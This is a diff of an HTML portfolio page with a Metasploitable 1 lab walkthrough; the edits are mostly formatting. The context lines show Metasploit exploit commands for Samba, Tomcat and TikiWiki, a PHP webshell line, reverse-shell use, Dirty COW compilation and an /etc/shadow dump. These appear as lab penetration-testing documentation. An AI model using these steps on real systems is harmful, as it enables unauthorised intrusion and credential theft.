@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Metasploitable  1 — VulnHub — MOSTAFA ELWASEEF's Portfolio</title>
+  <title>Metasploitable 1 — VulnHub — MOSTAFA ELWASEEF's Portfolio</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
   <style>
@@ -46,9 +46,10 @@
     .badge-os { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
     .badge-date { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
     .content { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
-    h1, h2, h3 { color: var(--text); font-weight: 600; margin: 2rem 0 .75rem; }
+    h1, h2, h3, h4 { color: var(--text); font-weight: 600; margin: 2rem 0 .75rem; }
     h2 { font-size: 1.35rem; padding-bottom: .5rem; border-bottom: 1px solid var(--border); }
     h3 { font-size: 1.1rem; color: var(--accent); }
+    h4 { font-size: .95rem; color: var(--muted); margin-top: 1.5rem; }
     p { margin: .6rem 0; color: #c9d1d9; }
     ul, ol { margin: .5rem 0 .5rem 1.5rem; }
     li { margin: .3rem 0; color: #c9d1d9; }
@@ -58,7 +59,7 @@
     pre { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius);
           padding: 1rem 1.25rem; overflow-x: auto; margin: .75rem 0; }
     code { font-family: 'Fira Code', monospace; font-size: .85rem; color: #e6edf3; }
-    p code, li code, td code, h1 code, h2 code, h3 code, blockquote code {
+    p code, li code, td code, h1 code, h2 code, h3 code, h4 code, blockquote code {
       background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; color: var(--accent); font-size: .82rem;
     }
     strong code { background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; }
@@ -105,8 +106,8 @@
 
 <div class="hero">
   <div class="hero-inner">
-    <div class="breadcrumb"><a href="../../index.html">Portfolio</a> / <a href="../../index.html#machines">Machines</a> / Metasploitable  1 — VulnHub</div>
-    <h1>Metasploitable  1 — VulnHub</h1>
+    <div class="breadcrumb"><a href="../../index.html">Portfolio</a> / <a href="../../index.html#machines">Machines</a> / Metasploitable 1 — VulnHub</div>
+    <h1>Metasploitable 1 — VulnHub</h1>
     <div class="meta-row">
       <span class="badge badge-platform">🖥 VulnHub</span>
       <span class="badge badge-easy">🟢 Beginner</span>
@@ -145,9 +146,9 @@
 <hr>
 <h2 id="attack-vector-1-samba-cve-2007-2447">Attack Vector 1 — Samba (CVE-2007-2447)</h2>
 <h3 id="enumeration">Enumeration</h3>
-<p>Objective</p>
+<h4 id="objective">Objective</h4>
 <p>Enumerate Samba shares and version details to identify exploitable misconfigurations or known vulnerabilities.</p>
-<p>Findings</p>
+<h4 id="findings">Findings</h4>
 <p><code>enum4linux 192.168.8.243</code> was run for null-session SMB enumeration, revealing the workgroup name, OS version, Samba version (3.0.20-Debian), user accounts, and share listings.</p>
 <p><strong>PoC:</strong><br>- <strong>Tools used</strong>: enum4linux<br>- <strong>Commands</strong>: <code>enum4linux 192.168.8.243</code><br>- <strong>Result</strong>: Null session successful; workgroup WORKGROUP; Samba 3.0.20-Debian confirmed; user accounts and share names enumerated.</p>
 <blockquote>  <figure><img src="images/metasploitable-1/397b7523717280d890bde71f154f2356.png" alt="screenshot" loading="lazy"></figure>
@@ -159,11 +160,10 @@
   <figure><img src="images/metasploitable-1/397b752371728006a27cf334fe47f6bb.png" alt="screenshot" loading="lazy"></figure>
   <figure><img src="images/metasploitable-1/397b75237172803f8cbee79e5c9403ec.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
-<hr>
 <h3 id="exploitation">Exploitation</h3>
-<p>Description</p>
+<h4 id="description">Description</h4>
 <p>Samba 3.0.20 through 3.0.25rc3 is vulnerable to CVE-2007-2447, a command injection flaw in the MS-RPC <code>SamrChangePassword</code> function via the <code>username</code> field. When the <code>username map script</code> option is enabled in smb.conf (as it is on Metasploitable 2), a crafted username is passed to <code>/bin/sh</code>, resulting in arbitrary command execution as root without authentication.</p>
-<p>PoC — Steps to Reproduce</p>
+<h4 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h4>
 <ol>
   <li>Launch Metasploit and load the exploit: <code>use exploit/multi/samba/usermap_script</code></li>
   <li>Set the target: <code>set RHOSTS 192.168.8.243</code></li>
@@ -178,9 +178,9 @@
 <hr>
 <h2 id="attack-vector-2-twiki-rce">Attack Vector 2 — TWiki RCE</h2>
 <h3 id="enumeration">Enumeration</h3>
-<p>Objective</p>
+<h4 id="objective">Objective</h4>
 <p>Enumerate web directories on port 80 and identify exploitable web applications.</p>
-<p>Findings</p>
+<h4 id="findings">Findings</h4>
 <p><code>gobuster dir</code> was run against <code>http://192.168.8.243</code> with a standard wordlist, uncovering <code>/twiki</code> among other directories. Navigating to the TWiki instance revealed version 20030201. <code>searchsploit twiki</code> was used to identify available exploits, surfacing the <code>642.pl</code> script for TWiki RCE.</p>
 <p><strong>PoC:</strong><br>- <strong>Tools used</strong>: gobuster, searchsploit<br>- <strong>Commands</strong>: <code>gobuster dir -u http://192.168.8.243 -w /usr/share/wordlists/dirb/common.txt</code><br>- <strong>Result</strong>: <code>/twiki</code> directory identified; TWiki version 20030201 confirmed; CVE applicable via <code>exploits/cgi-bin/642.pl</code>.</p>
 <blockquote>  <figure><img src="images/metasploitable-1/397b752371728020867cfe0692e773f0.png" alt="screenshot" loading="lazy"></figure>
@@ -193,11 +193,10 @@
   <figure><img src="images/metasploitable-1/397b752371728005accfd119908605e5.png" alt="screenshot" loading="lazy"></figure>
   <figure><img src="images/metasploitable-1/397b752371728018af9ef1a9ac07fadf.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
-<hr>
 <h3 id="exploitation">Exploitation</h3>
-<p>Description</p>
+<h4 id="description">Description</h4>
 <p>TWiki 20030201 contains a remote code execution vulnerability in the <code>search</code> functionality. The <code>642.pl</code> exploit script sends a crafted request to the TWiki CGI endpoint that passes user-supplied input unsanitized to a shell command, resulting in arbitrary command execution as the web server user (<code>www-data</code>).</p>
-<p>PoC — Steps to Reproduce</p>
+<h4 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h4>
 <ol>
   <li>Copy the exploit: <code>searchsploit -m exploits/cgi-bin/642.pl</code></li>
   <li>Execute the exploit against the TWiki search endpoint, passing a reverse shell payload as the command argument.</li>
@@ -209,9 +208,9 @@
 <hr>
 <h2 id="attack-vector-3-apache-tomcat-5-5-port-8180">Attack Vector 3 — Apache Tomcat 5.5 (Port 8180)</h2>
 <h3 id="enumeration">Enumeration</h3>
-<p>Objective</p>
+<h4 id="objective">Objective</h4>
 <p>Enumerate the Apache Tomcat Manager interface on port 8180 and test for default credential access.</p>
-<p>Findings</p>
+<h4 id="findings">Findings</h4>
 <p><code>gobuster dir</code> was run against <code>http://192.168.8.243:8180</code>, revealing the <code>/manager</code> path. The Metasploit <code>auxiliary/scanner/http/tomcat_mgr_login</code> module was used to brute-force the Manager interface and confirmed valid credentials: <code>[REDACTED]</code>.</p>
 <p><strong>PoC:</strong><br>- <strong>Tools used</strong>: gobuster, Metasploit (tomcat_mgr_login)<br>- <strong>Commands</strong>: <code>gobuster dir -u http://192.168.8.243:8180 -w /usr/share/wordlists/dirb/common.txt</code><br>- <strong>Result</strong>: <code>/manager</code> path confirmed; default credentials <code>[REDACTED]</code> valid on the Manager application.</p>
 <blockquote>  <figure><img src="images/metasploitable-1/397b75237172807dbac0f1950bf7237a.png" alt="screenshot" loading="lazy"></figure>
@@ -224,11 +223,10 @@
   <figure><img src="images/metasploitable-1/397b7523717280d5bd6bf9a780080b89.png" alt="screenshot" loading="lazy"></figure>
   <figure><img src="images/metasploitable-1/397b752371728066891bc2ec559ebff0.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
-<hr>
 <h3 id="exploitation">Exploitation</h3>
-<p>Description</p>
+<h4 id="description">Description</h4>
 <p>The Apache Tomcat Manager interface on port 8180 accepts WAR file uploads to deploy web applications. With valid credentials, a malicious WAR file containing a Java-based payload can be deployed, which Tomcat executes upon deployment. This provides a shell running as the <code>tomcat55</code> service account.</p>
-<p>PoC — Steps to Reproduce</p>
+<h4 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h4>
 <ol>
   <li>Load the exploit: <code>use exploit/multi/http/tomcat_mgr_deploy</code></li>
   <li>Set credentials: <code>set HttpUsername [REDACTED]</code> and <code>set HttpPassword [REDACTED]</code></li>
@@ -246,9 +244,9 @@
 <hr>
 <h2 id="attack-vector-4-tikiwiki-1-9-5">Attack Vector 4 — TikiWiki 1.9.5</h2>
 <h3 id="enumeration">Enumeration</h3>
-<p>Objective</p>
+<h4 id="objective">Objective</h4>
 <p>Enumerate the TikiWiki application on port 80, map its directory structure, and extract database credentials to identify further exploitation paths.</p>
-<p>Findings</p>
+<h4 id="findings">Findings</h4>
 <p><code>gobuster dir</code> was run against <code>http://192.168.8.243/tikiwiki</code> with a large wordlist, revealing key directories including <code>/backups</code>, <code>/files</code>, <code>/db</code>, and <code>/lib</code>. The <code>/backups</code> path in particular was noted as a potential upload and retrieval vector. The Metasploit <code>auxiliary/admin/tikiwiki/tikidblib</code> module was then run against the TikiWiki instance, exploiting a known information disclosure vulnerability to extract the database name (<code>tikiwiki195</code>) and credentials (<code>[REDACTED]</code>). These credentials were subsequently used with <code>mysql -h 192.168.8.243 -u root --ssl=0</code> to connect to MySQL and enumerate the TikiWiki database schema and user table.</p>
 <p><strong>PoC:</strong><br>- <strong>Tools used</strong>: gobuster, Metasploit (tikidblib), MySQL client<br>- <strong>Commands</strong>: <code>gobuster dir -u http://192.168.8.243/tikiwiki -w /usr/share/wordlists/dirb/big.txt</code> (directory enumeration); <code>use auxiliary/admin/tikiwiki/tikidblib</code> → <code>set RHOSTS 192.168.8.243</code> → <code>run</code> (credential extraction)<br>- <strong>Result</strong>: <code>/backups</code> directory discovered; TikiWiki database credentials extracted; MySQL access confirmed; <code>tikiwiki195</code> database enumerated.</p>
 <blockquote>  <figure><img src="images/metasploitable-1/397b7523717280d1b931dea6a8594dc7.png" alt="screenshot" loading="lazy"></figure>
@@ -258,11 +256,10 @@
   <figure><img src="images/metasploitable-1/397b7523717280da8543cb7b6d736e88.png" alt="screenshot" loading="lazy"></figure>
   <figure><img src="images/metasploitable-1/397b752371728068ab98e15e371dd37c.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
-<hr>
 <h3 id="exploitation">Exploitation</h3>
-<p>Description</p>
+<h4 id="description">Description</h4>
 <p>TikiWiki 1.9.5 allows authenticated users with file upload permissions to upload files through the backup/restore functionality. By uploading a PHP webshell disguised as a legitimate file, an attacker can gain remote code execution as <code>www-data</code>. The shell is accessed via the web server, and a Netcat reverse shell is then used to establish an interactive session.</p>
-<p>PoC — Steps to Reproduce</p>
+<h4 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h4>
 <ol>
   <li>Log in to TikiWiki using credentials extracted during enumeration.</li>
   <li>Upload a PHP command shell (<code>shell.php</code>) via the backup upload feature: <code>&lt;?php system("id"); ?&gt;</code></li>
@@ -292,9 +289,9 @@
 <h3 id="objective">Objective</h3>
 <p>Escalate privileges from service-level accounts (<code>www-data</code>, <code>tomcat55</code>) to root, and demonstrate full system compromise by reading <code>/etc/shadow</code>.</p>
 <h3 id="privilege-escalation-dirty-cow-cve-2016-5195">Privilege Escalation — Dirty COW (CVE-2016-5195)</h3>
-<p>Description</p>
+<h4 id="description">Description</h4>
 <p>The kernel version (2.6.24-16-server) is vulnerable to CVE-2016-5195 (Dirty COW), a race condition in the Linux kernel’s copy-on-write mechanism. The exploit modifies a read-only memory-mapped file (in this case <code>/etc/passwd</code>) by racing two threads — one writing to <code>/proc/self/mem</code> and one triggering copy-on-write. This allows an unprivileged user to overwrite the root password entry and escalate to root.</p>
-<p>PoC — Steps to Reproduce</p>
+<h4 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h4>
 <ol>
   <li>Transfer the exploit source to the target: download <code>linux/local/40839.c</code> from <code>searchsploit</code> and transfer via a Python HTTP server or <code>wget</code>.</li>
   <li>Compile on the target: <code>gcc 40839.c -o exploit2 -lpthread -lcrypt</code></li>
@@ -310,7 +307,6 @@
   <figure><img src="images/metasploitable-1/397b75237172800d85adeda4b6eb1577.png" alt="screenshot" loading="lazy"></figure>
   <figure><img src="images/metasploitable-1/397b7523717280d9b162dd2fbd36a127.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
-<hr>
 <h3 id="shadow-file-dump">Shadow File Dump</h3>
 <p>With root access confirmed, <code>/etc/shadow</code> was read to demonstrate full system compromise and credential access.</p>
 <ul>
